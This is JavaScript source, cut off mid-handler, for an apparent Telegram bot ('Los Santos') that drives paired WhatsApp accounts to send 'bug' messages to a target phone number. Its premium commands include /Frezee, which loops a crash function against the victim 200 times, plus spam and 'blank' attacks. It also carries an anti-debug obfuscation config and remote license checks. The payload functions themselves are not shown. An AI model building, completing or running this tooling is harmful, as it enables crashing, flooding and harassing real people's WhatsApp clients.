const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cfg = require("./Lossantos/config.js");
const cd = "cooldown.json";
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

// ========= \ DARK - PEMBATAS / =========\\
const pictUrl = "https://files.catbox.moe/8haa62.jpg";

// ========= \ DARK - PEMBATAS / =========\\
let premiumUsers = JSON.parse(fs.readFileSync('./Lossantos/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./Lossantos/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

// ========= \ DARK - PEMBATAS / =========\\
ensureFileExists('./Lossantos/premium.json');
ensureFileExists('./Lossantos/admin.json');

// ========= \ DARK - PEMBATAS / =========\\
function savePremiumUsers() {
    fs.writeFileSync('./Lossantos/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./Lossantos/admin.json', JSON.stringify(adminUsers, null, 2));
}

// ========= \ DARK - PEMBATAS / =========\\
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

// ========= \ DARK - PEMBATAS / =========\\
watchFile('./Lossantos/premium.json', (data) => (premiumUsers = data));
watchFile('./Lossantos/admin.json', (data) => (adminUsers = data));

// ========= \ DARK - PEMBATAS / =========\\
const axios = require("axios");
const chalk = require("chalk");
const figlet = require("figlet");
const config = require("./Lossantos/config.js");
const TelegramBot = require("node-telegram-bot-api");

// ========= \ DARK - PEMBATAS / =========\\
const BOT_TOKEN = config.BOT_TOKEN;

// ========= \ DARK - PEMBATAS / =========\\
const dbURL = "https://raw.githubusercontent.com/Leootheman/Database-Los-santos/refs/heads/main/tokens.json";

// ========= \ DARK - PEMBATAS / =========\\
async function fetchValidTokens() {
  try {
    const response = await axios.get(dbURL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(chalk.red("❌ Failed to fetch token list from GitHub:", error.message));
    return [];
  }
}

// ========= \ DARK - PEMBATAS / =========\\
async function validateToken() {
  console.log(chalk.blue("🔍 Check if the token is valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red(`
═══════════════════════════════════════════
 # 𝘝𝘌𝘙𝘐𝘍𝘐𝘊𝘈𝘛𝘐𝘖𝘕 𝘐𝘕𝘝𝘈𝘓𝘐𝘋 ( 𝘙𝘌𝘎𝘐𝘚𝘛𝘌𝘙 𝘠𝘖𝘜𝘙 𝘛𝘖𝘒𝘌𝘕𝘚 )
═══════════════════════════════════════════
`));
    process.exit(1);
  }

  console.log(chalk.green(` -# 𝘝𝘌𝘙𝘐𝘍𝘐𝘊𝘈𝘛𝘐𝘖𝘕 𝘝𝘈𝘓𝘐𝘋⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

// ========= \ DARK - PEMBATAS / =========\\
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ========= \ DARK - PEMBATAS / =========\\
function startBot() {
  console.clear();

  figlet("FLUXO", { font: "Slant" }, (err, data) => {
    if (err) return console.log("Error loading font");

    // Efek neon (cyan + glow)
    const neon = chalk.cyanBright(data);

    console.log(neon);
  });
}

validateToken();

// ========= \ DARK - PEMBATAS / =========\\
const switchUrl = ""; 
async function checkSecurityAndStart() {
    try {
        // --- Cek Status Kill Switch --- \\
        const { data: switchData } = await axios.get(switchUrl, { timeout: 5000 });
        
        if (switchData.status === 'off') {
            const message = switchData.message || 'Lisensi telah dicabut.';
            
            console.error(chalk.red('[ ❌ ] Akses Ditolak : Bot telah dihentikan!'));
            console.error(chalk.white(`From Devoloper : ${message}`));
            process.exit(1); 
        }

        return true; 

    } catch (e) {
        console.error(chalk.yellow('⚠️ Gagal memverifikasi status dari GitHub. Menghentikan bot untuk keamanan.'), e.message);
        
        process.exit(1);
    }
}

// ========= \ DARK - PEMBATAS / =========\\
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

// ========= \ DARK - PEMBATAS / =========\\
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("Connection.update", async (update) => {
            const { Connection, lastDisConnect } = update;
            if (Connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (Connection === "close") {
              const shouldReConnect =
                lastDisConnect?.error?.output?.statusCode !==
                DisConnectReason.loggedOut;
              if (shouldReConnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp Connections:", error);
  }
}

// ========= \ DARK - PEMBATAS / =========\\
let isWhatsAppConnected = false;
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

// ========= \ DARK - PEMBATAS / =========\\
async function ConnectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote><b>「 LOS SANTOS 」</b></blockquote>
𖣂. - Number : ${botNumber}.
⤷ Status : Process
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
    isWhatsAppConnected = false;
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote><b>「 LOS SANTOS 」</b></blockquote>
𖣂. - Number : ${botNumber}.
⤷ Status : Not Connected
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await ConnectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote><b>「 LOS SANTOS 」</b></blockquote>
𖣂. - Number : ${botNumber}.
⤷ Status : Gagal ❌
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      isWhatsAppConnected = true;
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote><b>「 LOS SANTOS 」</b></blockquote>
𖣂. - Number : ${botNumber}.
⤷ Status : Connected
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  let customcode = "LOSANTOS"
  const code = await sock.requestPairingCode(botNumber, customcode);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote><b>「 LOS SANTOS」</b></blockquote>
𖣂. - Number : ${botNumber}.
⤷ Code Pairing : ${formattedCode}
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        isWhatsAppConnected = false;
        await bot.editMessageText(
          `
<blockquote><b>「 LOS SANTOS」</b></blockquote>
𖣂. - Number : ${botNumber}.
⤷ Status : Error ❌ ${error.message}
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// ========= \ DARK - PEMBATAS / =========\\
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} D, ${hours} H, ${minutes} M, ${secs} S`;
}

// ========= \ DARK - PEMBATAS / =========\\
const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

// ========= \ DARK - PEMBATAS / =========\\
function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

// ========= \ DARK - PEMBATAS / =========\\
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}

// ========= \ DARK - PEMBATAS / =========\\
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

// ========= \ DARK - PEMBATAS / =========\\
function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `✅ - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "❌ - Tidak ada waktu aktif";
  }
}

// ========= \ DARK - PEMBATAS / =========\\
function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

// ========= \ DARK - PEMBATAS / =========\\
let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

// ========= \ DARK - PEMBATAS / =========\\
function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

// ========= \ DARK - PEMBATAS / =========\\
function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

// ========= \ DARK - PEMBATAS / =========\\
function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

// ========= \ DARK - PEMBATAS / =========\\
const getVincentObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        // Identifier generator pseudo-random tanpa crypto
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `Mortal和MortalJR无MortalJr气${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

// ========= \ DARK - PEMBATAS / =========\\
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ========= \ DARK - PEMBATAS / =========\\
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_© leo_",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}


// ========= / Function Bug \ ========= \\

// ========= / Last Function \ ========= \\

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

// ========= \ DARK - PEMBATAS / =========\\
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// ========= / Sleep Function \ ========= \\
const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username || "Unknown";
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const premStats = getPremiumStatus(senderId);

  bot.sendPhoto(chatId, pictUrl, {
    caption: `
<blockquote><b> (£) LOS SANTOS 🫀 </b></blockquote>
—Òlla ${username}, Спасибо за использование моего бота. LOS SANTOS,𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺

 ⊰─「 🫀 𖣂 𝐁𝐨𝐭 ⵢ. 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 」─⊱
 𖣂. Bot Name : <b>🫀. LOS SANTOS</b>
 𖣂. Versi Bot : 1 Vip
 𖣂. Creator : @leootheman
 𖣂. Owner  : @leootheman
 𖣂. Prefix : / - ( Slash ).
 𖣂. Language : TypeScript
 
 <code> #. LOS SANTOS</code>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
        { text: "🫀 LOS SANTOS͓", callback_data: "all_menu" }, 
        { text: "🦠 MENU AKSES", callback_data: "akses_menu" }
        ],
        [
        { text: "🫀 Leo ⵢ. Dev", url: "https://t.me/leootheman" }
        ]
      ]
    }
  });
});

// ========= \ DARK - PEMBATAS / =========\\
bot.on("callback_query", (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const username = callbackQuery.from.username || "Unknown";
  const senderId = callbackQuery.from.id;
  const data = callbackQuery.data;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const premStats = getPremiumStatus(senderId);
  const memory = formatMemory();
  const senderStatus = isWhatsAppConnected ? "✅ Connected" : "❌ Disconnect";
  let newCaption = "";
  let newButtons = [];

// ========= \ DARK - PEMBATAS / =========\\
  if (data === "all_menu") {
    newCaption = `
<blockquote><b> (£) LOS SANTOS  🫀 </b></blockquote>
—Òlla ${username}, Спасибо за использование моего бота. Nika,𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺

 ╋━ 「 ÷ 𝗕𝗢𝗧 ⵢ 𝗦𝗧𝗔𝗧𝗦 🫀 」  ━╋
<b> ɪ᪻ͥᷱ᷍. Online ÷ ${runtime}</b>
<b> ɪ᪻ͥᷱ᷍. Memory ÷ ${memory}</b>
<b> ɪ᪻ͥᷱ᷍. Premium ÷ ${premStats}</b>
<b> ɪ᪻ͥᷱ᷍. Sesion ÷ ${senderStatus}</b>
 
<b>┌────── [ 🫀 Menu ⵢ Utama ]</b> 
<b>│─ 𖣂. /credits – Development script</b>
<b>│─ 𖣂. /update – Update ( Jika ada info )</b>
<b>│─ 𖣂. /info – Info user-group-chnael</b>
<b>├──── </b>
<b>└ £ !.</b>

<code> #. LOS SANTOS</code>
`;
    newButtons = [
    [
    { text: "🦠 Bug ⵢ °Menu", callback_data: "trash_menu" },
    { text: "🍁 Tools ⵢ °Menu", callback_data: "tools_menu" }
    ],
    [
    { text: "🫀 Info ⵢ °Update", url: "t.me/testinewbyyanz" }
    ]
    ];
    
// ========= \ DARK - PEMBATAS / =========\\
  } else if (data === "akses_menu") {
    newCaption = `
<blockquote><b> (£) LOS SANTOS 🫀 </b></blockquote>
—Òlla ${username}, Спасибо за использование моего бота. LOS SANTOS,𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺

 ╋━ 「 ÷ 𝗕𝗢𝗧 ⵢ 𝗦𝗧𝗔𝗧𝗦 🫀 」  ━╋
<b> ɪ᪻ͥᷱ᷍. Online ÷ ${runtime}</b>
<b> ɪ᪻ͥᷱ᷍. Memory ÷ ${memory}</b>
<b> ɪ᪻ͥᷱ᷍. Premium ÷ ${premStats}</b>
<b> ɪ᪻ͥᷱ᷍. Sesion ÷ ${senderStatus}</b>

<b>┌────── [ 🫀 Menu ⵢ Akses ]</b> 
<b>│─ 𖣂. /addprem – id 30d</b>
<b>│─ 𖣂. /delprem – id</b>
<b>│─ 𖣂. /addadmin – id</b>
<b>│─ 𖣂. /deladmin – id</b>
<b>│─ 𖣂. /listprem – List prem user</b>
<b>│─ 𖣂. /setcd – set 1s, 1m</b>
<b>│─ 𖣂. /xpair – 62××</b>
<b>├──── </b>
<b>└ £ !.</b>

<code> #. LOS SANTOS</code>
`;
    newButtons = [[{ text: "Back °Menu 🍁", callback_data: "mainmenu" }]];

// ========= \ DARK - PEMBATAS / =========\\
  } else if (data === "trash_menu") {
    newCaption = `
<blockquote><b> (£) LOS SANTOS🫀 </b></blockquote>
—Òlla ${username}, Спасибо за использование моего бота. LOS SANTOS,𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺

 ╋━ 「 ÷ 𝗕𝗢𝗧 ⵢ 𝗦𝗧𝗔𝗧𝗦 🫀 」  ━╋
<b> ɪ᪻ͥᷱ᷍. Online ÷ ${runtime}</b>
<b> ɪ᪻ͥᷱ᷍. Memory ÷ ${memory}</b>
<b> ɪ᪻ͥᷱ᷍. Premium ÷ ${premStats}</b>
<b> ɪ᪻ͥᷱ᷍. Sesion ÷ ${senderStatus}</b>

<b>┌────── [ 🍁 Menu ⵢ bug Spam/non spam ]</b> 
<b>│─ 𖣂. /Frezee – Force Andro</b>
<b>│─ 𖣂. /leospam – Delay Mention</b>
<b>│─ 𖣂. /BlankKick – Blank Andro</b>
<b>│─ 𖣂. /Nuklir – combo Andro</b>
<b>├────── [ 🦠 Menu ⵢ Spesial ]</b>
<b>│─ 𖣂. /tesfunc – target loop</b>
<b>│─ 𖣂. /tofunc – Eval Whtasapp</b>
<b>├──── </b>
<b>└ £ !.</b>

<code> #. LOS SANTOS</code>
`;
    newButtons = [[{ text: "Back °Menu 🍁", callback_data: "mainmenu" }]];

// ========= \ DARK - PEMBATAS / =========\\
  } else if (data === "tools_menu") {
    newCaption = `
<blockquote><b> (£) LOS SANTOS 🫀 </b></blockquote>
—Òlla ${username}, Спасибо за использование моего бота. LOS SANTOS,𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺

╋━ 「 ÷ 𝗕𝗢𝗧 ⵢ 𝗦𝗧𝗔𝗧𝗦 🫀 」  ━╋
<b> ɪ᪻ͥᷱ᷍. Online ÷ ${runtime}</b>
<b> ɪ᪻ͥᷱ᷍. Memory ÷ ${memory}</b>
<b> ɪ᪻ͥᷱ᷍. Premium ÷ ${premStats}</b>
<b> ɪ᪻ͥᷱ᷍. Sesion ÷ ${senderStatus}</b>

<b>┌────── [ 🫀 Menu ⵢ Tools ]</b> 
<b>│─ 𖣂. /ssip – Quoted text ip</b>
<b>│─ 𖣂. /trackip – Lacak alamat dgn ip</b>
<b>│─ 𖣂. /pinsearch – Search pict pinterest</b>
<b>│─ 𖣂. /getcode – Get html source web</b>
<b>│─ 𖣂. /xnxx – Get vid 18+</b>
<b>│─ 𖣂. /ssweb – Ss web dengan -url-</b>
<b>│─ 𖣂. /spotify – Play music player</b>
<b>├──── </b>
<b>└ £ !.</b>

<code> #. LOS SANTOS</code>
`;
    newButtons = [[{ text: "Back °Menu 🍁", callback_data: "mainmenu" }]];

// ========= \ DARK - PEMBATAS / =========\\
  } else if (data === "mainmenu") {
    newCaption = `
    <blockquote><b> (£) LOS SANTOS 🫀 </b></blockquote>
—Òlla ${username}, Спасибо за использование моего бота. LOS SANTOS,𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺

 ⊰─「 🍁 𖣂 𝐁𝐨𝐭 ⵢ. 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 」─⊱
 𖣂. Bot Name : <b>🫀. SUNGOODNIKA</b>
 𖣂. Versi Bot : 1 Vip
 𖣂. Creator : @leootheman
 𖣂. Owner  : @leootheman
 𖣂. Prefix : / - ( Slash ).
 𖣂. Language : TypeScript
 
 <code> #. LOS SANTOS</code>
`;
    newButtons = [
       [
        { text: "🫀 LOS SANTOS", callback_data: "all_menu" }, 
        { text: "🦠 MENU AKSES", callback_data: "akses_menu" }
        ],
        [
        { text: "🫀 Leo ⵢ. Dev", url: "https://t.me/leootheman" }
        ]
    ];
  }

  bot.editMessageMedia(
    {
      type: "photo",
      media: pictUrl,
      caption: newCaption,
      parse_mode: "HTML"
    },
    { chat_id: chatId, message_id: messageId }
  ).then(() => {
    bot.editMessageReplyMarkup(
      { inline_keyboard: newButtons },
      { chat_id: chatId, message_id: messageId }
    );
  }).catch((err) => {
    console.error("Error editing message:", err);
  });
});


// ========= \ 𝘊𝘈𝘚𝘌 - 𝘛𝘙𝘈𝘚𝘏𝘌𝘙 / =========\\
bot.onText(/\/Frezee (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const cooldown = checkCooldown(senderId);

  const jid = target;
  const IsTarget = target;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, pictUrl, {
    caption: `
     ❌ No accses for this command 
    `,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "「 𝐎𝐰𝐧𝐞𝐫 」", url: cfg.URL }],
      ]
    }
  });
}

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /xpair 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, pictUrl, {
      caption: `
\`\`\`
LOS SANTOS
╰➤ F R E E Z E B U G 
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const Progesbar = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of Progesbar) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
LOS SANTOS 
╰➤ F R E E Z E B U G 
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 100; i++) {
    await xCursedFC(sock, target);
    await xCursedFC(sock, target);
    await sleep(1000);
    
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
LOS SANTOS 
╰➤ F O R C E 🦠 B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek 𖣂. °Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/\/leospam (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const cooldown = checkCooldown(senderId);

  const jid = target;
  const IsTarget = target;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, pictUrl, {
    caption: `
     ❌ No accses for this command 
    `,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "「 𝐎𝐰𝐧𝐞𝐫 」", url: cfg.URL }],
      ]
    }
  });
}

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /xpair 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, pictUrl, {
      caption: `
\`\`\`
LOS SANTOS
╰➤ D E L A Y 🦠 B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const Progesbar = [
